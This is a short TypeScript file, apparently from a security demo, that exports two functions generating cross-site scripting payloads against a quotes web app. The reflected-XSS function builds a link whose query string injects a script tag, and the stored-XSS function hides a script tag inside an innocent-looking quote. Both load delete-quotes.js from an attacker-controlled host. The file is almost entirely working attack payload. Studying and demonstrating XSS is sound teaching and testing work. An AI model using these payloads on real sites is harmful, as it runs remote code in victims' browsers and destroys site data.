export const getReflectedXSSScriptString = (
  attackerHost: string
) => `<a id="xss-anchor">Click here!</a> to fill quotes form automatically!
<script>
	// Add malicious query
	(() => {
		const redirectFromUrl = window.location.origin
		const linkEl = document.querySelector("#xss-anchor")
		const nameQuery= encodeURI("Wow!")
		const quoteQuery= encodeURI("Cool!<script src='${attackerHost}/delete-quotes.js' />")
		
		const hrefUrl = new URL(redirectFromUrl + "/create")
		hrefUrl.searchParams.set("name", nameQuery)
		hrefUrl.searchParams.set("quote", quoteQuery)
		linkEl.setAttribute("href", hrefUrl.toString())
	})()
</script>`;

export const getStoredXSSScriptString = (attackerHost: string) =>
  `Seemingly harmless quote! Lorem ipsum dolor sit amet, consectetur adipisicing elit. Fugit, quasi.<script src="${attackerHost}/delete-quotes.js"></script>`;
